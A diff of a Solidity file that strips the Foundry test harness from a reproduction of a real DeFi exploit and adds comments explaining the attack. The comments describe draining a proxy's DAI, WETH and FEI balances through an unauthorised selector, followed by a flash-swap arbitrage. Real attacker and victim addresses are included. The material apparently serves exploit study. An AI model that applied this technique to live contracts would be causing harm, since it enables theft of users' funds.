@@ -1,29 +1,34 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "../basetest.sol";
-
-// @KeyInfo - Total Lost : 7,630.46 USD
-// Attacker : 0xe4B97Db5FAF476DB464Bc271097Fac97d6CE3783
-// Attack Contract : 0x308a2c17e8f7C41982C8e944560876A0241324E1
-// Vulnerable Contract : 0x6f7a14bd931554683ED15Dc92e25D046eD68EA68
-// Attack Tx : https://etherscan.io/tx/0x653b185a57fb5909180fe4eede67e51c5e9b70af16937382f86d5aefe635e5a7
+// Standalone (non-Foundry) copy of the real exploit's attack contracts, taken
+// verbatim from evm-hack-registry/2025-08-unverified_6f7a_exp/test/unverified_6f7a_exp.sol.
+// The registry test wraps everything in `ContractTest is BaseTestWithBalanceLog`
+// (forge-std `Test`), whose cheatcode-only setup (vm.createSelectFork/vm.deal/
+// vm.startPrank) does not exist in the playground's client-side EVM. The real
+// entrypoint of the attack, `AttackOrchestrator.execute()`, is itself a plain
+// external payable function with NO cheatcode dependency — it is called here
+// directly as the synthetic exploit's attackFunction, dropping only the Test
+// harness wrapper.
 //
-// @Info
-// Vulnerable Contract Code : https://etherscan.io/address/0x6f7a14bd931554683ED15Dc92e25D046eD68EA68#code
-//
-// @Analysis
-// Twitter Guy : https://t.me/defimon_alerts/1706
-//
-// Attack summary: The attacker called an unverified implementation behind the proxy once for each token
-// balance held by the victim (DAI, WETH, and FEI), forcing those balances through its liquidity path. A final
-// FEI/DAI/WETH flash swap captured the resulting price imbalance as WETH profit.
-// Root cause: The proxy exposed selector 0xbfd479c4 without caller authorization or a constraint that the
-// token amount belonged to msg.sender, so an arbitrary caller could process the victim's live token balances.
+// Attack summary: for each token the victim proxy held (DAI, WETH, FEI), the
+// attacker bought a 100-wei "admission ticket" of that token, then called the
+// unverified proxy's selector 0xbfd479c4 with the VICTIM's full balance as the
+// `amount` argument. The proxy delegatecalled into its unverified implementation,
+// which forwarded the call to an unverified liquidity router that pulled the
+// victim's ENTIRE balance (not the attacker's) into a Uniswap V2 pair and swapped
+// it, with no check that the caller owned the funds being moved. After doing this
+// for all three tokens, the FEI/WETH and DAI/WETH pairs were left mispriced; a
+// final flash-swap arbitrage (borrow FEI, redeem 1:1 for DAI via the Fei-DAI PSM,
+// swap DAI for WETH, repay the FEI loan) captured the imbalance as ~0.2498 WETH
+// of clean profit.
+// Root cause: the proxy's selector 0xbfd479c4 (a rebalance/add-liquidity entry
+// point) had no caller authorization and no binding between the `amount`
+// parameter and funds actually owned/deposited by msg.sender, so an arbitrary
+// caller could force the victim's live token balances through the liquidity path.
 
 address constant ATTACKER = 0xe4B97Db5FAF476DB464Bc271097Fac97d6CE3783;
 address constant VULNERABLE_CONTRACT = 0x6F7a14Bd931554683ed15dC92e25D046Ed68EA68;
-address constant IMPLEMENTATION = 0x338FfEacCf929c88fb9574DC202dC1714b1903E7;
 address constant UNVERIFIED_ROUTER = 0x14E6D67F824C3a7b4329d3228807f8654294e4bd;
 address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
 address constant FEI_DAI_PSM = 0x7842186CDd11270C4Af8C0A99A5E0589c7F249ce;
@@ -71,57 +76,6 @@ interface IUniswapV2Callee {
 
 interface ISimpleFeiDaiPSM {
     function redeem(address to, uint256 amountFeiIn, uint256 minAmountOut) external returns (uint256 amountOut);
-}
-
-contract ContractTest is BaseTestWithBalanceLog {
-    function setUp() public {
-        uint256 forkBlock = 23_196_045;
-        vm.createSelectFork("http://127.0.0.1:8545", forkBlock);
-
-        fundingToken = WETH;
-        attacker = ATTACKER;
-
-        vm.label(ATTACKER, "Attacker");
-        vm.label(VULNERABLE_CONTRACT, "Unverified Proxy 6f7a");
-        vm.label(IMPLEMENTATION, "Unverified Implementation");
-        vm.label(UNVERIFIED_ROUTER, "Unverified Liquidity Router");
-        vm.label(FEI_DAI_PSM, "SimpleFeiDaiPSM");
-        vm.label(DAI_WETH_PAIR, "DAI-WETH Pair");
-        vm.label(FEI_WETH_PAIR, "FEI-WETH Pair");
-        vm.label(WETH, "WETH");
-        vm.label(DAI, "DAI");
-        vm.label(FEI, "FEI");
-    }
-
-    function testExploit() public {
-        uint256 victimDaiBefore = IERC20(DAI).balanceOf(VULNERABLE_CONTRACT);
-        uint256 victimWethBefore = IERC20(WETH).balanceOf(VULNERABLE_CONTRACT);
-        uint256 victimFeiBefore = IERC20(FEI).balanceOf(VULNERABLE_CONTRACT);
-        uint256 attackerWethBefore = IERC20(WETH).balanceOf(ATTACKER);
-
-        vm.deal(ATTACKER, 0.01 ether);
-
-        vm.startPrank(ATTACKER);
-        AttackOrchestrator orchestrator = new AttackOrchestrator();
-        vm.label(address(orchestrator), "Local Attack Orchestrator");
-        orchestrator.execute{value: 0.01 ether}();
-        vm.stopPrank();
-
-        uint256 victimDaiAfter = IERC20(DAI).balanceOf(VULNERABLE_CONTRACT);
-        uint256 victimWethAfter = IERC20(WETH).balanceOf(VULNERABLE_CONTRACT);
-        uint256 victimFeiAfter = IERC20(FEI).balanceOf(VULNERABLE_CONTRACT);
-        uint256 attackerWethAfter = IERC20(WETH).balanceOf(ATTACKER);
-
-        emit log_named_decimal_uint("Victim DAI drained", victimDaiBefore - victimDaiAfter, 18);
-        emit log_named_decimal_uint("Victim WETH drained", victimWethBefore - victimWethAfter, 18);
-        emit log_named_decimal_uint("Victim FEI drained", victimFeiBefore - victimFeiAfter, 18);
-        emit log_named_decimal_uint("Attacker WETH profit", attackerWethAfter - attackerWethBefore, 18);
-
-        assertLt(victimDaiAfter, 1 ether);
-        assertLe(victimWethAfter, 100);
-        assertLt(victimFeiAfter, 1 ether);
-        assertGt(attackerWethAfter - attackerWethBefore, 0.24 ether);
-    }
 }
 
 contract AttackOrchestrator {
